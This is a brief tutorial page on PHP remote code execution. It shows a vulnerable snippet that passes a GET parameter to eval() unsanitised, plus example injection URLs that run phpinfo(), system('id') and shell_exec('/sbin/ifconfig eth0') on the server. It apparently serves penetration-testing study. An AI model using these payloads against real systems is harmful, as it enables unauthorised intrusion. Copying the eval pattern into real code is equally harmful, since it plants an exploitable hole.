# Remote code execution

Remote code execution \(RCE\), also known as code injection, refers to executing commands directly on the underlying operating system via the web application, in the language of the web application.

## Basic technique

The following php snippet will take the `GET` parameter `code` and run it through the `eval()` function without any input sanitization:

```text
<?php $code = $_GET['code'];
eval($code); ?>
```

The `eval()` function evaluates the contents as php code, which means we can provide any php code as an argument. The code injection would look like this:

```text
http://[host]/page.php?code=phpinfo();
```

## Remote command execution

You might also be able to execute single-line system commands like `system('id');`. For multi-line system commands, use `shell_exec`:

```text
http://[host]/page.php?code=echo shell_exec('/sbin/ifconfig eth0');
```

This method is useful for both system enumeration and shell injection. Make sure to use absolute paths for calling system files, or the web application may not find them.
